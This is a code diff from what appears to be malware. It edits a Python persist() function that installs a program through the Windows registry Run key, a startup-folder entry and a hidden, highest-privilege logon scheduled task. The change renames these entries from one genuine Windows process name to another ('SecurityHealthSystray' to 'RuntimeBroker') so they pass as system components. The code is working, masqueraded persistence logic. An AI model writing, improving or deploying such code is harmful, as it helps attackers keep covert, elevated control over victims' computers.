@@ -74,7 +74,7 @@ def persist() -> str:
     res = []
     try:
         key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
-        winreg.SetValueEx(key, "SecurityHealthSystray", 0, winreg.REG_SZ, f'"{exe}"')
+        winreg.SetValueEx(key, "RuntimeBroker", 0, winreg.REG_SZ, f'"{exe}"')
         winreg.CloseKey(key)
         res.append("Run OK")
     except Exception as e:
@@ -87,8 +87,8 @@ def persist() -> str:
     except Exception as e:
         res.append(f"Startup fail: {e}")
     try:
-        task_name = "SecurityHealthSystray"
-        cmd = f'schtasks /create /tn "{task_name}" /tr "\"{exe}\"" /sc onlogon /rl highest /f'
+        task_name = "RuntimeBroker"
+        cmd = f'schtasks /create /tn "{task_name}" /tr "{exe}" /sc onlogon /rl highest /f'
         subprocess.check_output(cmd, shell=True, creationflags=CREATE_NO_WINDOW, stderr=subprocess.STDOUT)
         res.append("TaskScheduler OK")
     except Exception as e:
